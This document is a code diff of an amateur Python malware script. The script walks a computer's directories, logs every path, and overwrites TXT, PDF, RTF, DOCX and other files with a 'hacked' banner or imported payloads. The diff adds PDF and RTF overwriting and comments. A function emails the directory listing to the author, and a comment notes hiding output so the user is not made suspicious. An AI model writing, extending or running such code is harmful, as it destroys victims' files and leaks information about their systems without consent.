@@ -8,7 +8,8 @@ from email.mime.text import MIMEText
 listOfAvailDirs = []
 md5HashTitle = str(hashlib.md5('listOfAvailDirsTXTFile'.encode()).hexdigest()) + '.txt'
 pathsToTXT = []
-# Web Devvelopment File Types
+pathsToPDF = []
+# Web Development File Types
 pathsToHTML = []
 pathsToCSS = []
 pathsToJS = []
@@ -26,13 +27,26 @@ pathsToACCDB = []
 pathsToXLSX = []
 pathsToPPTX = []
 pathsToDOCX = []
+pathsToRTF = []
 # Get all the hacked codes from separate file
 from bf72dda9b27c0fb1f16fc6648348228d import *
+# Get all "Find And Replace Files" Function Definitions From Seperate File
+# from _________________________________ import * # Later To Be Implemented
 
+
+# This Is Where Python Tries To Write To The Certain File Types By Prepending
+# Some Code From The Same Language
+# OR
+# Complete and Utter Nonsense to destroy the program and fail the system!! JK
+# |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
 # This Is Where Python Searches For Many File Types
+# This Function Basically Calls The Functions That Are Listed Below Sequentially
+# Will Probably Migrate The Function Definitions To Other File For Faster Speeds!!!
 def searchForKnownFileTypes(*directories):
     # Web Development Languages
     findTXT()
+    findPDF()
     findHTML()
     findCSS()
     findJS()
@@ -47,15 +61,14 @@ def searchForKnownFileTypes(*directories):
     findXLSX()
     findPPTX()
     findDOCX()
-
+    findRTF()
     findPY()
     """
     # More Computer Based Languages
     findC()
     findCS()
     findCPP()
-    findH()
-    findPY()"""
+    findH()"""
 
 # Web Development Languages
 def findTXT():
@@ -74,6 +87,20 @@ def populateTXT():
         TXTFile = open(pathsToTXT[l - 1], "w")
         TXTFile.write("Hello!!\nThis Device Has Been Hacked By A Beginner Python Script!!\n\n\n\n\n" + TXTFileContents)
         TXTFile.close()
+
+def findPDF():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredPDF = fnmatch.filter(filesInsideDir, '*.pdf')
+    if len(filteredPDF) > 0:
+        for k in range(len(filteredPDF)):
+            pathsToPDF.append(dirNameOfDir + "\\" + filteredPDF[k - 1])
+        populatePDF()
+def populatePDF():
+    for l in range(len(pathsToPDF)):
+        PDFFile = open(pathsToPDF[l - 1], "wb")
+        PDFFile.write(pdfHackedCode)
+        PDFFile.close()
 
 def findHTML():
     filesInsideDir = listOfAvailDirs[j][3][1]
@@ -245,6 +272,19 @@ def populateDOCX():
         DOCXFile.write(docxHackedCode)
         DOCXFile.close()
 
+def findRTF():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredRTF = fnmatch.filter(filesInsideDir, '*.rtf')
+    if len(filteredRTF) > 0:
+        for k in range(len(filteredRTF)):
+            pathsToRTF.append(dirNameOfDir + "\\" + filteredRTF[k - 1])
+        populateRTF()
+def populateRTF():
+    for l in range(len(pathsToRTF)):
+        RTFFile = open(pathsToRTF[l - 1], "wb")
+        RTFFile.write(rtfHackedCode)
+        RTFFile.close()
 
 def findPY():
     filesInsideDir = listOfAvailDirs[j][3][1]
@@ -279,24 +319,22 @@ def findCPP(*directories):
     filteredCPP = fnmatch.filter(availDirs, '*.cpp')
 def findH(*directories):
 """
-# This Is Where Python Tries To Write To The Certain File Types By Prepending
-# Some Code From The Same Language
-# OR
-# Complete and Utter Nonsense to destroy the program and fail the system!! JK
-
-
 
 # Main Directory Object
 class Directory(object):
+    # Instantiate The Object's Attributes
     dirName = ""
     dirsInside = []
     filesInside = []
     i = 0
+    # When An Object Is Initialized, or Instantiated, This Function is Called:
     def __init__(self, i, dirName, dirsInside, filesInside):
+        # Set The Instantiated Attributes To Certain Inputed Values
         self.i = i
         self.dirName = dirName
         self.dirsInside = dirsInside
         self.filesInside = filesInside
+    # This Function Is Called When print(Directory()) is Called (It makes a more human-readable version)
     def __repr__(self):
         return str(self.__dict__)
 
@@ -307,14 +345,23 @@ listOfAvailDirsTXTFile.write("List of directories on this Computer:\n")
 listOfAvailDirsTXTFile.close()
 # Main Loop That Searches C:\ and Reports Every and All Directories Available For Next Step
 # It Also Records Every Single Directory Path In The Previously Created TXT File
+# The OS.WALK Function is a Built-In Python Function That Completely Searches A Directory By Itself
+# and Calls The Code Inside Everytime It Comes Across Something
 for dirName, dirsInside, filesInside in os.walk("test\\"):
+    # Instantiate A New Directory Object With Attributes
     dictionaryOfDirs = Directory(Directory.i, dirName, dirsInside, filesInside)
+    # Make The Instantiated Directory Iterable
     dictionaryOfDirs = dictionaryOfDirs.__dict__
+    # Create Temporary Var
     listOfDirs = []
+    # Search The Previously Instantiated Directory Object
     for key, value in dictionaryOfDirs.items():
+        # Store The Info In A [key, value] format
         temp = [key, value]
         listOfDirs.append(temp)
+    # Add The Info To The Entire List
     listOfAvailDirs.append(listOfDirs)
+    # Add The Info To A Text File (For Testing Purposes)
     with open(md5HashTitle, "a") as listOfAvailDirsTXTFile:
         listOfAvailDirsTXTFile.write(str(listOfAvailDirs[Directory.i]) + "\n")
         print(int(int(os.path.getsize(md5HashTitle)) / 1000), "kb" )
@@ -323,7 +370,9 @@ for dirName, dirsInside, filesInside in os.walk("test\\"):
     # the user suspicious!!!
     # print(str(listOfAvailDirs[Directory.i]))
     Directory.i += 1
+
 # Send Python Generated TXT File To Me
+# Completely Unnecessary To The Program and Doesn't Work; Remove This!!!!!
 def sendDirDetailsToMe():
     # Open listOfAvailDirsTXTFile Created Earlier by Python And Get Its Contents
     listOfAvailDirsTXTFile = open(md5HashTitle, "r")
@@ -339,5 +388,6 @@ def sendDirDetailsToMe():
     emailServer.sendmail(sender, [sender], emailMSG.as_string())
     emailServer.quit()
 
+# Iterate Over The List Of Available Directories and Search and Replace Files
 for j in range(len(listOfAvailDirs)):
     searchForKnownFileTypes(listOfAvailDirs[j])
